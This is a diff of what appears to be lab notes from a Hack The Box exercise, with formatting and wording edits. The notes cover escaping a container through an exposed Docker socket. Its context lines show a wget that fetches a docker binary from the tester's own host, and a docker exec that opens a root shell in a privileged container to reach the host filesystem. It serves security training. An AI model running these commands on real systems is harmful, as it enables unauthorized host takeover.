@@ -97,7 +97,7 @@ drwxr-xr-x 1 root        root        4096 Jun 30 15:12 ..
 srw-rw---- 1 root        root           0 Jun 30 15:27 docker.sock
 ```
 
-**From here on, we can use the docker binary to interact with the socket and enumerate what docker containers are already running. If not installed, then we can download it here and upload it to the Docker container.**
+**From here on, we can use the `docker` binary to interact with the socket and enumerate what docker containers are already running. If not installed, then we can download it **[here](https://master.dockerproject.com/linux/x86_64/docker)** and upload it to the Docker container.**
 ```
 htb-student@container:/tmp$ wget https://<parrot-os>:443/docker -O docker
 htb-student@container:/tmp$ chmod +x docker
@@ -124,7 +124,7 @@ CONTAINER ID     IMAGE         COMMAND                 CREATED           STATUS 
 <SNIP>
 ```
 
-**Now, we can log in to the new privileged Docker container with the ID 7ae3bcc818af and navigate to the /hostsystem.**
+**Now, we can log in to the new privileged Docker container with the ID `7ae3bcc818af` and navigate to the `/hostsystem`.**
 ```
 htb-student@container:/app$ /tmp/docker -H unix:///app/docker.sock exec -it 7ae3bcc818af /bin/bash
 
@@ -192,7 +192,7 @@ drwxr-xr-x  13 root root  4096 Apr 23  2020 var
 ```
 
 # PoC of Creating a new docker
-**If there's no `docker` running on the machine but there does have a docker image just simple create the new docker will stop immediately, what we need to just while creating the new docker add a command for it.**
+**If there's no `docker` running on the machine but there does have a docker image if we just simple create the new docker it will run but it will stop immediately, what we need to just while creating the new docker add a command for it.**
 
 ![Proof of Concept](PoC-Container-Docker-Sockets.png)
 
